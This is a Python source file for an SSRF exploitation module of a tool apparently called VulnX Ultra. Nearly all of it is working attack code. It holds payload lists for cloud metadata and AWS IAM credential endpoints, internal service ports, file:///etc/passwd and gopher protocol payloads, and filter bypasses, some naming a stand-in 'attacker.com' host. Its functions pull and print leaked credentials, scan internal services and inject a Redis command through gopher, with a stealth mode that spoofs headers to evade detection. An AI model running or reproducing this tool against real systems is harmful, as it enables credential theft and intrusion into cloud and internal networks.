#!/usr/bin/env python3
"""
SSRF Exploitation Module for VulnX Ultra

"""

import requests
import urllib.parse
import socket
import time
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
import logging
import re
import json
import base64
import random

console = Console()

class SSRFExploiter:
    def __init__(self, url, param, proxies=None, stealth=False, delay=0, output="ssrf_exploit"):
        self.url = url
        self.param = param
        self.proxies = proxies
        self.stealth = stealth
        self.delay = delay
        self.output = output
        self.vulnerable = False
        self.exploit_results = []
        
        # Advanced SSRF payloads
        self.cloud_metadata_payloads = [
            # AWS
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            # GCP
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1beta1/",
            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            # DigitalOcean
            "http://169.254.169.254/metadata/v1/"
        ]
        
        self.internal_services_payloads = [
            "http://127.0.0.1:80/",
            "http://localhost:8080/",
            "http://127.0.0.1:3306/",  # MySQL
            "http://127.0.0.1:6379/",  # Redis
            "http://127.0.0.1:9200/",  # Elasticsearch
            "http://127.0.0.1:5601/",  # Kibana
            "http://127.0.0.1:8080/manager/html",  # Tomcat
            "http://localhost:2375/containers/json"  # Docker
        ]
        
        self.protocol_payloads = [
            "file:///etc/passwd",
            "dict://127.0.0.1:3306/info",
            "gopher://127.0.0.1:6379/_INFO",
            "ldap://127.0.0.1:389/",
            "sftp://attacker.com:22/",
            "http+unix://%2Fvar%2Frun%2Fdocker.sock/info"
        ]
        
        self.bypass_payloads = [
            "http://2130706433/",  # Decimal 127.0.0.1
            "http://0177.0.0.1/",  # Octal
            "http://0x7f.0.0.0x1/",  # Hex
            "http://127.1/",
            "http://localhost./",
            "http://example.com@127.0.0.1/",
            "http://127.0.0.1#@attacker.com/"
        ]

    def get_random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
        return random.choice(user_agents)

    def send_request(self, payload):
        headers = {
            "User-Agent": self.get_random_user_agent(),
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        
        if self.stealth:
            headers.update({
                "X-Forwarded-For": "1.1.1.1",
                "Referer": "https://www.google.com/",
                "Accept-Language": "en-US,en;q=0.5"
            })
        
        try:
            if "?" in self.url:
                test_url = f"{self.url}&{self.param}={payload}"
            else:
                test_url = f"{self.url}?{self.param}={payload}"
            
            time.sleep(self.delay + (random.uniform(0, 1) if self.stealth else 0))
            
            response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
            return response
            
        except Exception as e:
            logging.error(f"Error sending SSRF payload: {str(e)}")
            return None

    def check_vulnerability(self):
        console.print(Panel.fit("[bold yellow]Checking SSRF Vulnerability[/bold yellow]"))
        
        test_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://127.0.0.1:80/"  # Localhost
        ]
        
        for payload in test_payloads:
            response = self.send_request(payload)
            if response:
                if response.status_code == 200 and ("instance-id" in response.text.lower() or "html" in response.text.lower()):
                    self.vulnerable = True
                    console.print(f"[green]✓ Vulnerable to SSRF (Payload: {payload})[/green]")
                    logging.info(f"SSRF vulnerability confirmed with payload: {payload}")
                    return True
        
        console.print("[red]✗ Target does not appear to be vulnerable to SSRF[/red]")
        return False

    def exploit_metadata(self):
        console.print(Panel.fit("[bold red]Exploiting Cloud Metadata Services[/bold red]"))
        
        for payload in self.cloud_metadata_payloads:
            response = self.send_request(payload)
            if response and response.status_code == 200:
                self.exploit_results.append({
                    "type": "Cloud Metadata",
                    "payload": payload,
                    "status": response.status_code,
                    "response": response.text[:500] + "..." if len(response.text) > 500 else response.text
                })
                
                console.print(f"[green]✓ Successfully accessed: {payload}[/green]")
                console.print(f"[yellow]Response (first 500 chars):[/yellow]\n{response.text[:500]}...")
                
                # Special handling for AWS credentials
                if "iam/security-credentials/" in payload and "RoleName" in response.text:
                    role_name = re.search(r'"RoleName":\s*"([^"]+)"', response.text).group(1)
                    creds_payload = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                    creds_response = self.send_request(creds_payload)
                    
                    if creds_response and creds_response.status_code == 200:
                        self.exploit_results.append({
                            "type": "AWS Credentials",
                            "payload": creds_payload,
                            "status": creds_response.status_code,
                            "response": creds_response.text
                        })
                        console.print(f"[bold red]⚠ AWS Credentials Leaked![/bold red]")
                        console.print(creds_response.text)

    def scan_internal_services(self):
        console.print(Panel.fit("[bold red]Scanning Internal Services[/bold red]"))
        
        for port in [80, 8080, 3306, 6379, 9200, 5601, 2375]:
            payload = f"http://127.0.0.1:{port}/"
            response = self.send_request(payload)
            
            if response:
                service_name = self.identify_service(response, port)
                self.exploit_results.append({
                    "type": "Internal Service",
                    "payload": payload,
                    "status": response.status_code,
                    "response": response.text[:200] + "..." if len(response.text) > 200 else response.text,
                    "service": service_name
                })
                
                if response.status_code != 404:
                    console.print(f"[green]✓ Found active service on port {port}: {service_name}[/green]")
                    console.print(f"[yellow]Response (first 200 chars):[/yellow]\n{response.text[:200]}...")

    def identify_service(self, response, port):
        if port == 3306 and ("mysql" in response.text.lower() or "sql" in response.text.lower()):
            return "MySQL"
        elif port == 6379 and ("redis" in response.text.lower() or "info" in response.text.lower()):
            return "Redis"
        elif port == 9200 and ("elasticsearch" in response.text.lower() or "cluster_name" in response.text.lower()):
            return "Elasticsearch"
        elif port == 5601 and ("kibana" in response.text.lower()):
            return "Kibana"
        elif port == 2375 and ("docker" in response.text.lower() or "containers" in response.text.lower()):
            return "Docker API"
        elif port == 8080 and ("tomcat" in response.text.lower() or "manager/html" in response.text.lower()):
            return "Tomcat"
        else:
            return f"Unknown Service (Port {port})"

    def exploit_protocols(self):
        console.print(Panel.fit("[bold red]Testing Dangerous Protocols[/bold red]"))
        
        for payload in self.protocol_payloads:
            response = self.send_request(payload)
            if response:
                self.exploit_results.append({
                    "type": "Protocol Exploit",
                    "payload": payload,
                    "status": response.status_code,
                    "response": response.text[:500] + "..." if len(response.text) > 500 else response.text
                })
                
                if response.status_code == 200:
                    console.print(f"[green]✓ Protocol worked: {payload}[/green]")
                    if "file://" in payload and "root:" in response.text:
                        console.print(f"[yellow]File contents:[/yellow]\n{response.text[:500]}...")
                    elif "gopher://" in payload and ("redis" in response.text.lower() or "info" in response.text.lower()):
                        console.print("[bold red]⚠ Redis accessed via Gopher protocol![/bold red]")

    def test_bypass_techniques(self):
        console.print(Panel.fit("[bold red]Testing SSRF Bypass Techniques[/bold red]"))
        
        for payload in self.bypass_payloads:
            response = self.send_request(payload)
            if response:
                self.exploit_results.append({
                    "type": "Bypass Attempt",
                    "payload": payload,
                    "status": response.status_code,
                    "response": response.text[:200] + "..." if len(response.text) > 200 else response.text
                })
                
                if response.status_code == 200:
                    console.print(f"[green]✓ Bypass worked: {payload}[/green]")

    def post_exploitation(self):
        console.print(Panel.fit("[bold red]Post-Exploitation Actions[/bold red]"))
        
        # Check if we found Redis
        redis_payloads = [r for r in self.exploit_results if "redis" in str(r).lower()]
        if redis_payloads:
            console.print("[yellow]Attempting Redis command injection...[/yellow]")
            redis_cmd = "SET vulnx true"
            encoded_cmd = urllib.parse.quote(redis_cmd)
            gopher_payload = f"gopher://127.0.0.1:6379/_{encoded_cmd}"
            
            response = self.send_request(gopher_payload)
            if response:
                console.print("[green]✓ Redis command sent (check if executed)[/green]")
                self.exploit_results.append({
                    "type": "Redis Command",
                    "payload": gopher_payload,
                    "status": response.status_code,
                    "response": response.text[:200] + "..." if len(response.text) > 200 else response.text
                })

    def save_results(self):
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"{self.output}_{timestamp}.json"
        
        try:
            with open(filename, "w") as f:
                json.dump(self.exploit_results, f, indent=4)
            console.print(f"[green]✓ Exploit results saved to {filename}[/green]")
        except Exception as e:
            console.print(f"[red]✗ Error saving results: {str(e)}[/red]")

    def display_results(self):
        if not self.exploit_results:
            console.print("[yellow]No exploitation results to display[/yellow]")
            return
            
        table = Table(title="[bold]SSRF Exploitation Results[/bold]", show_lines=True)
        table.add_column("Type", style="cyan")
        table.add_column("Payload", style="magenta")
        table.add_column("Status", style="green")
        table.add_column("Response Preview", style="yellow")
        
        for result in self.exploit_results:
            status = str(result.get("status", "N/A"))
            if status.startswith("2"):
                status = f"[green]{status}[/green]"
            else:
                status = f"[red]{status}[/red]"
                
            response_preview = result.get("response", "N/A")[:50].replace("\n", " ")
            
            table.add_row(
                result.get("type", "N/A"),
                result.get("payload", "N/A"),
                status,
                response_preview
            )
        
        console.print(table)

    def exploit(self):
        if not self.check_vulnerability():
            return False
            
        self.exploit_metadata()
        self.scan_internal_services()
        self.exploit_protocols()
        self.test_bypass_techniques()
        self.post_exploitation()
        
        self.display_results()
        self.save_results()
        
        return True
        